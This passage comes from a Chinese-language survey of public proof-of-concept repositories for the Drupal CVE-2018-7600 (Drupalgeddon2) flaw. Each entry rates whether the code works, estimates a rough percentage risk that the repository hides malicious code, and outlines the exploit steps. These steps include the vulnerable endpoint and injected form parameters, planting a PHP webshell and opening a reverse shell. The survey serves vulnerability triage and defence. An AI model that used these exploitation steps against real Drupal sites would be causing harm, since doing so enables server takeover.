提供的PoC代码是有效的。PoC.py脚本用于验证目标Drupal站点是否存在漏洞，通过发送特制的请求在目标服务器上创建一个名为hh.txt的文件。Exp.py脚本则利用此漏洞在目标站点根目录下创建一个名为hh.php的后门文件，该后门允许通过GET或POST参数'c'执行任意系统命令。从提供的命令执行结果来看，PoC和Exp都成功执行，验证了漏洞的存在和利用。

**投毒风险：**
分析提供的PoC和Exp代码，没有发现明显的投毒代码。脚本的功能主要是利用漏洞进行验证和创建后门，没有发现恶意修改系统配置、窃取敏感信息或进行其他恶意行为的代码。README.md文件只是简单的漏洞描述和使用说明，没有包含任何可疑内容。因此，可以认为此仓库的投毒风险较低，为0%。

**利用方式：**
漏洞的利用方式是：

1.  **漏洞验证：** 使用PoC.py脚本验证目标Drupal站点是否存在CVE-2018-7600漏洞。
2.  **后门植入：** 如果PoC验证成功，使用Exp.py脚本在目标站点根目录下创建一个后门文件（hh.php）。后门文件包含PHP代码，允许通过GET/POST参数'c'执行任意系统命令。
3.  **远程控制：** 使用WebShell管理工具（如AntSword）连接到后门文件，通过'c'参数执行系统命令，实现对目标服务器的远程控制。

总的来说，该漏洞利用简单，危害巨大，攻击者可以利用该漏洞完全控制未打补丁的Drupal服务器。

**项目地址:** [killeveee/CVE-2018-7600](https://github.com/killeveee/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #13

**来源**: [CVE-2018-7600-knqyf263_CVE-2018-7600.md](../2018/CVE-2018-7600-knqyf263_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者在Drupal服务器上执行任意代码。

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点需要运行在受影响的版本范围内，并且需要启用默认或常见的模块配置。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600 (Drupalgeddon2) 允许远程攻击者利用多个子系统中的缺陷执行任意代码。该漏洞的利用方式通常涉及构造恶意的HTTP请求，该请求包含精心设计的查询参数，这些参数利用了Drupal的输入验证漏洞，特别是与AJAX表单处理相关的漏洞。攻击者可以利用`element_parents`和`#lazy_builder`属性在服务器上执行PHP代码。提供的POC代码通过向`/user/register`端点发送POST请求，并在`mail`参数中注入恶意代码（`exec('echo vuln > hello.txt')`），尝试在目标服务器上创建一个名为`hello.txt`的文件，内容为`vuln`。如果成功创建该文件，则表明漏洞存在且可利用。

**有效性：**
从提供的漏洞信息、搜索结果和漏洞利用代码来看，此POC代码的有效性较高。多个来源表明该漏洞是真实存在的，并且存在公开可用的漏洞利用代码。搜索结果中也提到了针对此漏洞的Metasploit模块。

**投毒风险：**
该仓库中的投毒风险较低，大概在10%左右。Dockerfile文件只是简单的指定了Drupal镜像和维护者信息, README.md文件也只是简单的描述了漏洞和利用方式。exploit.py的代码功能相对简单，目的是验证漏洞的存在，风险较低。然而，仍然存在一定的风险，因为攻击者可能修改`exploit.py`以执行更危险的操作，例如下载并执行恶意软件，或者修改服务器配置。因此，在使用此POC代码时，务必对其进行仔细审查，并在隔离的环境中运行。

**利用方式：**
1.  攻击者构造一个包含恶意payload的HTTP POST请求，发送到Drupal站点的`/user/register`端点。
2.  Payload利用`element_parents`参数和`#lazy_builder`属性，在服务器端触发PHP代码执行。
3.  执行的PHP代码可以将任意命令注入到服务器的操作系统中。
4.  通过访问生成的`hello.txt`文件来验证漏洞是否成功利用。

**项目地址:** [knqyf263/CVE-2018-7600](https://github.com/knqyf263/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #14

**来源**: [CVE-2018-7600-madneal_codeql-scanner.md](../2018/CVE-2018-7600-madneal_codeql-scanner.md)

## CVE-2018-7600-Drupalgeddon2-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点存在漏洞且可网络访问，可能需要了解一些Drupal站点配置信息。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心中存在远程代码执行漏洞。攻击者可以通过发送特制的请求到未打补丁的Drupal站点来执行任意代码。

**有效性：**
根据漏洞库信息、搜索结果（包括NVD、Rapid7、Tenable等）以及Exploit-DB中的expolit，此漏洞是真实存在的，并且有可用的POC。提供的README.md文件表明存在一个用于CVE-2018-7600的Python利用脚本（尽管这里没有提供脚本本身）。综合来看，利用是有效的。

**投毒风险：**
提供的POC代码只有README.md，内容非常简单，没有发现任何恶意代码或潜在的投毒行为。但是，由于缺失了核心的Python脚本，无法完全确定是否存在投毒风险。假定之后找到的利用脚本来源不可靠，存在修改或添加恶意代码的可能性，因此存在一定的投毒风险。这里给出一个较低的投毒风险概率，假设为5%。

**利用方式：**
漏洞的利用方式是向Drupal站点发送精心构造的恶意HTTP请求，利用Drupal的输入验证缺陷，在服务器端执行任意代码。根据搜索结果，该漏洞影响Drupal的多个子系统，可能利用了Drupal的渲染机制或其他处理输入的方式。攻击者通过构造包含恶意代码的请求参数，例如在URL或POST数据中，可以触发远程代码执行。具体细节取决于Drupal的版本和配置。Metasploit也提供了利用模块。

**总结：**
CVE-2018-7600是一个高危的Drupal远程代码执行漏洞，已经存在公开的POC。尽管提供的POC文件本身没有发现恶意代码，但获取利用脚本时需要注意来源，防范潜在的投毒风险。利用方式是通过构造恶意HTTP请求，利用Drupal的输入验证缺陷执行任意代码。

**项目地址:** [madneal/codeql-scanner](https://github.com/madneal/codeql-scanner)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #15

**来源**: [CVE-2018-7600-mr-won_CVE-2018-7600..md](../2018/CVE-2018-7600-mr-won_CVE-2018-7600..md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致网站完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点存在漏洞且允许外部网络访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个影响Drupal 7.x和8.x的远程代码执行漏洞。攻击者可以通过构造特定的HTTP请求，利用Drupal的多个子系统中的缺陷，在目标服务器上执行任意代码。

**有效性：**
根据漏洞库信息、搜索结果和提供的PoC代码，该漏洞的利用是有效的。搜索结果中多个链接表明该漏洞已被广泛利用，并且存在公开的Exploit。

**投毒风险：**
提供的PoC代码相对简单，主要功能是发送一个包含恶意payload的POST请求到`/user/register`，并在目标服务器上创建一个名为`r3dxploit.txt`的文件，内容为“vulnerable to cve-7600-2018 exploit”。代码本身没有明显的恶意行为，如删除文件、上传恶意文件或执行其他危险操作。但是，在实际使用中，攻击者可以将payload修改为更具破坏性的命令，例如下载和执行恶意脚本。此外，代码作者信息中包含了一些可能与恶意活动相关的标识，例如使用“R3DXPLOIT”作为用户名和涉及Root权限的字眼。综合考虑，PoC代码本身存在一定潜在风险，但主要取决于使用者如何修改payload，因此投毒风险初步评估为10%。

**利用方式：**
1.  攻击者构造一个包含恶意payload的POST请求，该payload利用`user_register_form`的ajax功能注入恶意代码。
2.  请求发送到`/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax`端点。
3.  Drupal处理请求时，由于输入验证不足，导致恶意代码被执行。
4.  PoC代码中，恶意代码的功能是在目标服务器上创建一个文件，表明漏洞存在。
5.  攻击者可以修改payload执行任意命令，例如反弹shell，从而完全控制目标服务器。

**项目地址:** [mr-won/CVE-2018-7600.](https://github.com/mr-won/CVE-2018-7600.)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #16

**来源**: [CVE-2018-7600-muhammedkayag_CVE-2018-7600.md](../2018/CVE-2018-7600-muhammedkayag_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 需要Drupal网站启用user register功能，且未及时更新补丁

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个Drupal核心中的未经身份验证的远程代码执行漏洞。攻击者可以通过构造特定的请求，利用Drupal的表单渲染机制，在服务器上执行任意代码。

**有效性：**
根据漏洞库信息和搜索引擎结果，该漏洞影响多个Drupal版本，且存在公开的漏洞利用代码。提供的POC代码利用了Drupal的`/user/register`接口，通过`element_parents`和`ajax_form`参数，以及`mail[#post_render][]`等构造恶意的payload，从而实现远程代码执行。该POC代码的有效性较高，因为很多文章和EXP都在使用此种方法。

**投毒风险：**
查看POC代码，发现其功能是发送恶意请求以利用漏洞并在目标机器上建立反向shell。在提供的代码里，存在一个比较明显的风险是，如果攻击者修改了 `command` 变量，有可能植入恶意后门，该变量定义了反向shell连接的目标 IP 地址和端口。 还有就是代码中包含的利用成功后的提示信息，如果被篡改，可能导致用户误判，这些地方存在一定的投毒风险。综合来看，代码的投毒风险为10%，主要是因为利用代码本身功能比较直接，修改后容易被发现。

**利用方式：**
1.  **目标确定：** 确定目标Drupal网站，且版本在受影响范围内（Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1）。
2.  **监听端口：** 使用`listener()`函数在攻击机上监听指定端口（默认为1337），等待反向shell连接。
3.  **构造Payload：**  构造恶意的POST请求，利用`user/register`接口，并设置`element_parents`、`ajax_form`、`mail[#post_render][]`等参数，将要执行的命令嵌入到`mail[#markup]`中。
4.  **发送请求：** 使用`requests.post()`函数将构造好的Payload发送到目标Drupal网站。
5.  **建立连接：**  如果目标网站存在漏洞且利用成功，目标机器会执行Payload中的命令，即建立与攻击机指定端口的反向shell连接。
6.  **交互式Shell：**  连接建立后，`listener()`函数会将终端设置为raw模式，实现与目标机器的交互式shell会话。

**项目地址:** [muhammedkayag/CVE-2018-7600](https://github.com/muhammedkayag/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #17

**来源**: [CVE-2018-7600-nika0x38_CVE-2018-7600.md](../2018/CVE-2018-7600-nika0x38_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 需要目标Drupal站点存在漏洞且可网络访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600（Drupalgeddon 2）是一个存在于Drupal多个子系统中的远程代码执行漏洞，影响多个使用了默认或常见模块配置的Drupal版本。攻击者可以通过构造特制的请求来利用此漏洞，从而在目标服务器上执行任意代码。

**有效性：**
根据提供的漏洞信息和搜索结果，此漏洞是真实存在的，并且有公开可用的PoC代码。搜索结果表明，该漏洞被广泛利用，并对大量Drupal网站造成了影响。因此，提供的漏洞利用代码大概率有效，可以用于远程代码执行。

**投毒风险：**
提供的代码片段是`Cargo.lock`文件，该文件是Rust项目的依赖锁定文件，用于记录项目中使用的所有依赖项及其版本。该文件本身不包含任何可执行代码，因此不存在投毒风险。

**利用方式：**
利用方式通常涉及发送特制的HTTP请求，其中包含恶意代码，该代码将被Drupal服务器执行。具体利用方式取决于Drupal的配置，常见的利用方式是利用Drupal的renderable arrays特性，在请求参数中构造恶意的renderable arrays，触发PHP代码执行。攻击者通常会利用此漏洞执行系统命令，例如下载并执行恶意脚本，或者在服务器上安装后门。

**项目地址:** [nika0x38/CVE-2018-7600](https://github.com/nika0x38/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #18

**来源**: [CVE-2018-7600-r0lh_CVE-2018-7600.md](../2018/CVE-2018-7600-r0lh_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal网站存在漏洞且允许未授权用户访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个存在于Drupal核心中的远程代码执行漏洞。攻击者可以通过构造恶意请求，利用Drupal的多个子系统（默认或常见模块配置）中的缺陷，在服务器上执行任意代码。 

**有效性分析：**

根据漏洞库信息和搜索结果，此漏洞是真实存在的，并且影响了多个Drupal版本。漏洞利用代码（PoC）的存在进一步证实了漏洞的可利用性。PoC代码的分析表明，它通过构造一个特殊的请求到`/user/register`路径，利用`element_parents`参数中的注入点执行命令。该PoC代码使用`drupal_ajax`的`_wrapper_format`，允许绕过一些安全检查。PoC首先设置目标URL，然后进入一个循环，该循环允许用户输入命令。命令通过`bash -c`执行，并将输出写入`poutput.txt`文件，然后读取此文件以显示命令的执行结果。

**投毒风险分析：**

分析提供的Go代码和相关文件，没有发现明显的投毒代码。该代码的主要功能是利用CVE-2018-7600漏洞在目标Drupal服务器上执行命令。代码使用`net/http`库发送HTTP请求，并使用`golang.org/x/net/proxy`库支持SOCKS5代理。代码从标准输入读取命令，并通过POST请求将其发送到目标服务器。然后，代码从服务器读取命令的输出并将其打印到标准输出。虽然该代码本身不包含恶意行为，但漏洞利用本身可能被滥用。

**利用方式总结：**

1.  **漏洞入口点：** `/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax`
2.  **攻击方式：** 通过POST请求，利用`mail[#post_render][]`、`mail[#type]`和`mail[#markup]`参数注入恶意代码。
3.  **命令执行：**  `mail[#markup]`参数中包含要执行的bash命令，利用`bash -c`执行。
4.  **结果获取：** 命令执行结果被写入`poutput.txt`文件，然后通过GET请求获取。
5.  **利用流程：**
    *   构造包含恶意代码的POST请求发送到漏洞入口点。
    *   Drupal解析请求并执行`mail[#markup]`参数中的命令。
    *   执行结果写入`poutput.txt`文件。
    *   攻击者通过GET请求读取`poutput.txt`文件获取命令执行结果。

**缓解措施：**

*   尽快将Drupal升级到不受影响的版本（7.58及以上，8.3.9及以上，8.4.6及以上，或8.5.1及以上）。
*   应用官方提供的补丁。
*   实施Web应用防火墙（WAF）规则来检测和阻止利用此漏洞的攻击。

**项目地址:** [r0lh/CVE-2018-7600](https://github.com/r0lh/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #19

**来源**: [CVE-2018-7600-r3dxpl0it_CVE-2018-7600.md](../2018/CVE-2018-7600-r3dxpl0it_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 需要目标Drupal站点未打补丁且可以通过网络访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心的远程代码执行漏洞。根据漏洞库信息和搜索结果，该漏洞影响多个Drupal版本，允许未经身份验证的远程攻击者执行任意代码。漏洞产生的原因是由于Drupal在处理用户输入时，对某些请求参数过滤不严，导致可以注入恶意代码。

**有效性：**
根据提供的漏洞信息和搜索结果，存在多个公开可用的漏洞利用代码（Exploit-DB等），并且有报告表明该漏洞已被广泛利用，因此该漏洞的POC是有效的。

**投毒风险：**
提供的漏洞利用代码只有GNU GENERAL PUBLIC LICENSE，是一个开源协议，不存在后门或者恶意代码,投毒风险为0。

**利用方式：**
利用方式主要通过构造恶意的HTTP请求，向Drupal服务器发送包含恶意代码的参数。恶意代码通常通过`#`和`[]`进行注入，利用Drupal的渲染机制执行PHP代码。攻击者可以执行任意系统命令，控制服务器。

根据搜索结果，攻击者通常利用以下方式：
1.  发送包含恶意payload的POST请求到Drupal站点。
2.  利用Drupal的渲染机制执行payload中的PHP代码。
3.  在服务器上执行任意命令，例如安装后门、窃取数据等。

**项目地址:** [r3dxpl0it/CVE-2018-7600](https://github.com/r3dxpl0it/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #20

**来源**: [CVE-2018-7600-rabbitmask_CVE-2018-7600-Drupal7.md](../2018/CVE-2018-7600-rabbitmask_CVE-2018-7600-Drupal7.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码。

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点存在漏洞且可公开访问

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600，也被称为Drupalgeddon2，是一个存在于Drupal核心中的远程代码执行漏洞。漏洞原因是由于Drupal在处理某些请求时，未对用户输入进行充分验证，导致攻击者可以在未经身份验证的情况下，通过构造特制的请求来执行任意代码。

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，可以判断该漏洞是有效的，并且存在公开可用的POC。

**投毒风险：**
提供的POC代码主要包含两个Python脚本：

*   `CVE-2018-7600-Drupal7-EXP.py`: 该脚本接收目标URL、命令、执行函数、代理等参数，通过构造恶意请求，向目标Drupal站点发送包含命令的payload，从而执行任意代码。
*   `CVE-2018-7600-Drupal7.py`: 该脚本通过读取`target.txt`文件中的目标URL，批量执行`whoami`命令，并将结果保存到`result.txt`文件中。
*   `README.md`: 描述了脚本的使用方法。

仔细分析这些代码，未发现明显的恶意行为或后门。`CVE-2018-7600-Drupal7.py` 脚本批量扫描是封装了`whoami`的exp。

但是，仍然存在一定的投毒风险，主要体现在以下几个方面：

1.  **依赖风险：** 脚本可能依赖于特定的第三方库，如果这些库被恶意修改，可能会导致脚本执行恶意代码。
2.  **命令注入风险：**  虽然脚本主要执行的是 `whoami` 命令，但是攻击者可以修改脚本，执行其他更具危害性的命令，比如删除文件、修改配置等。EXP.py允许自定义执行命令，存在风险。在使用时需要注意目标和命令。

总体而言，该仓库中作者隐藏的投毒代码的风险较低，大约为5%。

**利用方式：**

1.  **目标探测：**  使用`CVE-2018-7600-Drupal7.py` 脚本,通过提供包含目标URL的 `target.txt` 文件，批量扫描存在漏洞的Drupal站点。
2.  **漏洞利用：**  使用`CVE-2018-7600-Drupal7-EXP.py` 脚本，指定目标URL和要执行的命令，通过构造恶意请求，在目标Drupal站点上执行任意代码。 EXP.py允许自定义执行函数passthru，同样存在风险。
3.  **结果验证：**  检查命令执行的结果，确认漏洞是否成功利用。

**总结：**
CVE-2018-7600是一个高危的远程代码执行漏洞，攻击者可以利用该漏洞在Drupal站点上执行任意代码。虽然提供的POC代码本身不存在明显的恶意行为，但是仍然存在一定的投毒风险。在使用这些代码时，需要谨慎评估风险，并采取相应的安全措施。

**项目地址:** [rabbitmask/CVE-2018-7600-Drupal7](https://github.com/rabbitmask/CVE-2018-7600-Drupal7)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #21

**来源**: [CVE-2018-7600-rafaelcaria_drupalgeddon2-CVE-2018-7600.md](../2018/CVE-2018-7600-rafaelcaria_drupalgeddon2-CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点必须使用受影响的版本，且未打补丁。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个Drupal核心的远程代码执行漏洞。该漏洞源于Drupal的Forms API中存在属性注入缺陷，允许未经身份验证的攻击者通过构造特制的请求来执行任意代码。

**有效性：**
根据提供的漏洞信息、搜索结果和漏洞利用代码，此漏洞的POC代码是有效的。漏洞库信息明确指出存在远程代码执行，搜索结果中也确认了该漏洞的严重性和广泛利用。提供的Python脚本`drupalgeddon2.py`允许测试目标是否易受攻击，并执行任意命令。

**投毒风险：**
虽然提供的代码可以直接利用漏洞执行命令，但仍然存在一定的投毒风险，例如：
*   该仓库只包含简单的利用脚本和一个README,代码量少,检查难度低. 
*   代码中利用`requests`库发送HTTP请求，如果被篡改，可能会向恶意服务器发送敏感信息或执行其他恶意操作.因为代码量少,只有10%的风险。

**利用方式：**
该漏洞的利用方式如下：
1.  攻击者构造一个包含恶意参数的HTTP POST请求，发送到目标Drupal站点的`user/password`路径。
2.  恶意参数利用了Drupal Forms API中的`#post_render`属性，允许攻击者指定一个PHP函数（例如`passthru`）来执行命令。
3.  `name[#markup]`参数包含要执行的操作系统命令。
4.  目标Drupal站点处理请求时，会执行攻击者指定的命令。
5.  攻击者可以通过`?q=/file/ajax/name/%23value/` 获取命令执行的结果。

总之，CVE-2018-7600是一个严重的安全漏洞，允许远程攻击者执行任意代码。提供的POC代码是有效的，但使用者应谨慎使用，并注意潜在的投毒风险。

**项目地址:** [rafaelcaria/drupalgeddon2-CVE-2018-7600](https://github.com/rafaelcaria/drupalgeddon2-CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #22

**来源**: [CVE-2018-7600-rajaabdullahnasir_CVE-2018-7600-Remote-Code-Execution.md](../2018/CVE-2018-7600-rajaabdullahnasir_CVE-2018-7600-Remote-Code-Execution.md)

## CVE-2018-7600-Drupalgeddon2-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 需要Drupal网站运行在受影响的版本，且允许未授权访问的URL。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个Drupal核心的远程代码执行漏洞。由于Drupal的Form API（FAPI）在处理AJAX请求时，未充分清理数组值，导致未经身份验证的攻击者可以通过构造恶意请求来执行任意代码。利用方式通常涉及发送包含恶意payload的POST请求到特定Drupal路径（例如/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax）。

**有效性：**
根据漏洞库信息、搜索引擎结果（如NVD、Rapid7、Trend Micro等）以及提供的POC代码，此漏洞是真实存在的，并且存在公开可用的利用代码。POC代码提供单目标、多目标、自定义命令执行等功能，并具有彩色CLI输出和日志记录，增加了利用的便利性，因此该POC代码有效。

**投毒风险：**
分析提供的`drupalgeddon2.py`代码片段，未发现明显的恶意投毒代码。代码主要功能是发送HTTP请求，执行命令，并解析结果，都是漏洞利用的正常行为。虽然存在远程代码执行的风险，但这是漏洞本身的性质，而不是POC引入的额外风险。README中存在免责声明，强调该工具仅用于授权的渗透测试。投毒风险评估为10%，主要考虑到以下几点：
* 代码的复杂性可能隐藏不易察觉的后门。
* 作者有可能在后续版本中添加恶意代码。

**利用方式：**
1.  确定目标Drupal网站是否运行在受影响的版本（Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1）。
2.  使用提供的POC脚本，指定目标URL和要执行的命令。
3.  运行脚本，脚本会发送特制的HTTP POST请求到Drupal网站。
4.  如果漏洞存在，Drupal网站将执行指定的命令，并将结果返回给攻击者。
5.  攻击者可以利用此漏洞进一步控制服务器，例如安装恶意软件、窃取数据等。

**项目地址:** [rajaabdullahnasir/CVE-2018-7600-Remote-Code-Execution](https://github.com/rajaabdullahnasir/CVE-2018-7600-Remote-Code-Execution)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #23

**来源**: [CVE-2018-7600-raytran54_CVE-2018-7600.md](../2018/CVE-2018-7600-raytran54_CVE-2018-7600.md)

## CVE-2018-7600 Drupalgeddon2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未授权远程代码执行

**影响版本:** Drupal 7.x < 7.58, Drupal 8.x < 8.3.9, Drupal 8.4.x < 8.4.6, Drupal 8.5.x < 8.5.1

**利用条件:** 目标Drupal站点启用user_register_form或者其他存在可利用的Form API Ajax Request的模块

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个存在于Drupal核心中的远程代码执行漏洞。攻击者可以通过构造恶意的请求，利用Drupal的Form API中的漏洞，在目标服务器上执行任意代码。

**有效性分析：**

根据提供的漏洞库信息、搜索结果以及漏洞利用代码，该漏洞的POC代码是有效的。搜索结果中包含了多个关于该漏洞的分析、利用以及修复建议，证明该漏洞在野外被广泛利用。

提供的Python POC利用了user_register_form，通过修改mail字段，构造恶意的payload，将命令注入到#post_render中，触发远程代码执行。代码首先构造包含恶意命令的POST请求，发送到/user/register，然后尝试读取/res.txt，如果成功读取，则表明目标存在漏洞，并输出命令执行结果。

**投毒风险分析：**

提供的POC代码本身较为简洁，主要功能是发送恶意请求并读取结果。README.md文件主要包含漏洞分析、原理说明和缓解措施。检查了Python脚本，发现它执行命令并将输出写入一个名为res.txt的文件，这本身不是投毒，而是漏洞利用的一部分。但理论上，如果攻击者替换了POC中执行的命令，可能会导致服务器执行恶意操作，例如下载恶意软件或修改系统配置。但基于目前提供的文件内容，投毒风险极低。

综合考虑，该仓库存在投毒代码的风险极低，约为1%。

**利用方式分析：**

1.  **漏洞触发点：** Drupal的Form API在处理Ajax请求时，没有充分验证用户输入，导致可以注入恶意代码。
2.  **利用途径：** 攻击者通过构造特殊的POST请求，修改`form_id`、`_drupal_ajax`，`mail[#post_render][]`等参数。
3.  **代码执行：** Drupal在处理请求时，会将`mail[#post_render][]`中的内容作为PHP函数执行，从而导致远程代码执行。
4.  **验证：** POC通过执行命令，并将结果写入res.txt文件，然后尝试读取该文件来验证漏洞是否存在。

**防范措施:**

*   及时升级Drupal版本到安全版本（7.58, 8.3.9, 8.4.6, 或 8.5.1之后）。
*   应用Drupal官方提供的补丁。
*   使用Web应用防火墙（WAF）过滤恶意请求。

**项目地址:** [raytran54/CVE-2018-7600](https://github.com/raytran54/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #24

**来源**: [CVE-2018-7600-ruthvikvegunta_Drupalgeddon2.md](../2018/CVE-2018-7600-ruthvikvegunta_Drupalgeddon2.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁，且使用默认或常见模块配置

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心的远程代码执行漏洞。漏洞原因是由于Drupal在处理某些用户输入时，未进行充分的验证和过滤，导致攻击者可以通过构造恶意的请求，将恶意代码注入到系统，从而实现远程代码执行。

**有效性：**

根据漏洞库信息、搜索引擎结果以及大量的公开利用代码来看，该漏洞的利用具有很高的有效性。 搜索结果中，许多文章都讨论了该漏洞的利用方法，Metasploit中也有相应的利用模块，Exploit-DB上也有相关的exploit。

**投毒风险：**

提供的漏洞利用代码仅包含GNU GPL许可协议，没有发现直接的恶意代码。但是，任何从不可信来源获取的代码都存在潜在的投毒风险。即使代码本身看起来无害，也可能存在细微的缺陷或依赖关系，这些缺陷或依赖关系可能会被恶意利用。因此，对下载的POC代码进行代码审计是必要的。

考虑到仅仅是LICENSE文件，投毒概率极低，仅为5%。

**利用方式：**

利用方式通常涉及以下步骤：

1.  **发送恶意请求：** 攻击者构造包含恶意代码的特殊请求，该请求通常通过URL参数或POST数据发送。
2.  **利用漏洞：** Drupal在处理该请求时，由于输入验证不足，会将恶意代码传递给PHP的`exec()`或类似函数执行。
3.  **执行任意代码：** 恶意代码在服务器上执行，攻击者可以控制服务器，例如安装后门、窃取数据等。

攻击者可以利用该漏洞执行任意系统命令，从而完全控制受影响的Drupal服务器。该漏洞影响多个Drupal版本，因此影响范围非常广泛。

**项目地址:** [ruthvikvegunta/Drupalgeddon2](https://github.com/ruthvikvegunta/Drupalgeddon2)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #25

